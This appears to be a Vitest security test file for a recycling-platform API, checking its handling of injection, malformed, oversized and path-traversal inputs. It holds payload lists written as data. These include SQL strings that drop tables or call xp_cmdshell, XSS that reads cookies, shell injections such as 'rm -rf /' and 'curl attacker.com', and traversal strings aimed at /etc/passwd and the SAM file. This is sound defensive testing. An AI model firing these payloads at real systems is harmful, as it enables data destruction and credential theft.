import { describe, it, expect } from 'vitest';
import axios from 'axios';

const API_URL = process.env.API_URL || 'http://localhost:3000/api';

describe('Injection & Input Validation Security', () => {
  describe('SQL/ORM Injection', () => {
    const sqlPayloads = [
      "'; DROP TABLE participants; --",
      "1' OR '1'='1",
      "1; DELETE FROM waste; --",
      "UNION SELECT * FROM users --",
      "admin'--",
      "' OR 1=1 UNION SELECT null,null,null --",
      "1' WAITFOR DELAY '0:0:5' --",
      "'; EXEC xp_cmdshell('dir'); --",
    ];

    for (const payload of sqlPayloads) {
      it(`should not execute SQL: ${payload.substring(0, 30)}...`, async () => {
        try {
          await axios.post(`${API_URL}/participants/register`, {
            name: payload,
            role: 'recycler',
          });
        } catch (error: any) {
          expect(error.response?.status).not.toBe(500);
        }
      });
    }

    it('should handle SQL injection in query parameters', async () => {
      try {
        await axios.get(`${API_URL}/participants`, {
          params: { id: "1' OR '1'='1" },
        });
      } catch (error: any) {
        expect(error.response?.status).not.toBe(500);
      }
    });

    it('should handle SQL injection in waste listing', async () => {
      try {
        await axios.get(`${API_URL}/waste/list`, {
          params: { filter: "'; DROP TABLE waste; --" },
        });
      } catch (error: any) {
        expect(error.response?.status).not.toBe(500);
      }
    });
  });

  describe('XSS / Script Injection', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert(1)>',
      '"><script>alert(document.cookie)</script>',
      "javascript:alert('XSS')",
      '<svg onload=alert(1)>',
      '{{7*7}}',
      '${7*7}',
      '<iframe src="javascript:alert(1)">',
    ];

    for (const payload of xssPayloads) {
      it(`should sanitize XSS payload in registration: ${payload.substring(0, 30)}...`, async () => {
        try {
          const res = await axios.post(`${API_URL}/participants/register`, {
            name: payload,
            role: 'recycler',
          });
          if (res.status === 200 || res.status === 201) {
            const data = JSON.stringify(res.data);
            expect(data).not.toContain('<script>');
            expect(data).not.toContain('onerror=');
            expect(data).not.toContain('onload=');
          }
        } catch (error: any) {
          expect(error.response?.status).not.toBe(500);
        }
      });
    }

    it('should not reflect XSS in API responses', async () => {
      try {
        const res = await axios.get(`${API_URL}/participants`);
        const data = JSON.stringify(res.data);
        expect(data).not.toMatch(/<script[^>]*>/i);
        expect(data).not.toMatch(/javascript:/i);
        expect(data).not.toMatch(/on\w+\s*=/i);
      } catch (error: any) {
        expect(error.response?.status).not.toBe(500);
      }
    });
  });

  describe('Command Injection', () => {
    const commandPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '`id`',
      '$(whoami)',
      '; rm -rf /',
      '|| curl attacker.com',
      '\n/bin/sh',
    ];

    for (const payload of commandPayloads) {
      it(`should reject command injection: ${payload.substring(0, 20)}...`, async () => {
        try {
          await axios.post(`${API_URL}/participants/register`, {
            name: `test${payload}`,
            role: 'recycler',
          });
        } catch (error: any) {
          expect(error.response?.status).not.toBe(500);
        }
      });
    }
  });

  describe('Malformed JSON & Type Confusion', () => {
    it('should reject malformed JSON body', async () => {
      try {
        await axios.post(`${API_URL}/waste/submit`, 'not json at all', {
          headers: { 'Content-Type': 'application/json' },
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 422]).toContain(error.response?.status);
      }
    });

    it('should reject null body', async () => {
      try {
        await axios.post(`${API_URL}/waste/submit`, null, {
          headers: { 'Content-Type': 'application/json' },
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 422]).toContain(error.response?.status);
      }
    });

    it('should reject array body instead of object', async () => {
      try {
        await axios.post(`${API_URL}/waste/submit`, [1, 2, 3], {
          headers: { 'Content-Type': 'application/json' },
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 422]).toContain(error.response?.status);
      }
    });

    it('should reject string where number expected', async () => {
      try {
        await axios.post(`${API_URL}/waste/submit`, {
          waste_type: 'plastic',
          weight: 'not-a-number',
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 422]).toContain(error.response?.status);
      }
    });

    it('should reject negative weight values', async () => {
      try {
        await axios.post(`${API_URL}/waste/submit`, {
          waste_type: 'plastic',
          weight: -100,
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 422]).toContain(error.response?.status);
      }
    });

    it('should reject zero weight', async () => {
      try {
        await axios.post(`${API_URL}/waste/submit`, {
          waste_type: 'plastic',
          weight: 0,
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 422]).toContain(error.response?.status);
      }
    });

    it('should reject excessively large weight values', async () => {
      try {
        await axios.post(`${API_URL}/waste/submit`, {
          waste_type: 'plastic',
          weight: Number.MAX_SAFE_INTEGER,
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 422]).toContain(error.response?.status);
      }
    });
  });

  describe('Oversized & Boundary Inputs', () => {
    it('should reject oversized request bodies', async () => {
      try {
        const oversizedPayload = {
          waste_type: 'plastic',
          weight: 100,
          data: 'x'.repeat(2 * 1024 * 1024),
        };
        await axios.post(`${API_URL}/waste/submit`, oversizedPayload, {
          headers: { 'Content-Type': 'application/json' },
          maxContentLength: Infinity,
          maxBodyLength: Infinity,
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 413, 422]).toContain(error.response?.status);
      }
    });

    it('should reject empty string inputs for required fields', async () => {
      try {
        await axios.post(`${API_URL}/participants/register`, {
          name: '',
          role: 'recycler',
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 422]).toContain(error.response?.status);
      }
    });

    it('should reject excessively long strings', async () => {
      try {
        await axios.post(`${API_URL}/participants/register`, {
          name: 'A'.repeat(10000),
          role: 'recycler',
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 422]).toContain(error.response?.status);
      }
    });

    it('should reject coordinates outside valid ranges', async () => {
      try {
        await axios.post(`${API_URL}/participants/register`, {
          name: 'Test',
          role: 'recycler',
          lat: 999,
          lon: 999,
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 422]).toContain(error.response?.status);
      }
    });

    it('should reject invalid role values', async () => {
      try {
        await axios.post(`${API_URL}/participants/register`, {
          name: 'Test',
          role: 'superadmin',
        });
        expect(false).toBe(true);
      } catch (error: any) {
        expect([400, 422]).toContain(error.response?.status);
      }
    });
  });

  describe('Path Traversal', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '%2e%2e%2f%2e%2e%2f',
      '....//....//',
      '/etc/passwd%00',
    ];

    for (const payload of pathTraversalPayloads) {
      it(`should reject path traversal: ${payload.substring(0, 30)}...`, async () => {
        try {
          await axios.get(`${API_URL}/waste/${payload}`);
        } catch (error: any) {
          expect(error.response?.status).not.toBe(500);
          if (error.response?.status === 200) {
            const body = JSON.stringify(error.response.data);
            expect(body).not.toContain('root:');
            expect(body).not.toContain('password');
          }
        }
      });
    }
  });

  describe('Header Injection', () => {
    it('should reject CRLF injection in headers', async () => {
      try {
        await axios.get(`${API_URL}/health`, {
          headers: { 'X-Custom': 'value\r\nInjected-Header: malicious' },
        });
      } catch (error: any) {
        expect(error.response?.status).not.toBe(500);
      }
    });

    it('should reject oversized headers', async () => {
      try {
        await axios.get(`${API_URL}/health`, {
          headers: { 'X-Large-Header': 'X'.repeat(8192) },
        });
      } catch (error: any) {
        expect([400, 413, 431]).toContain(error.response?.status);
      }
    });
  });
});
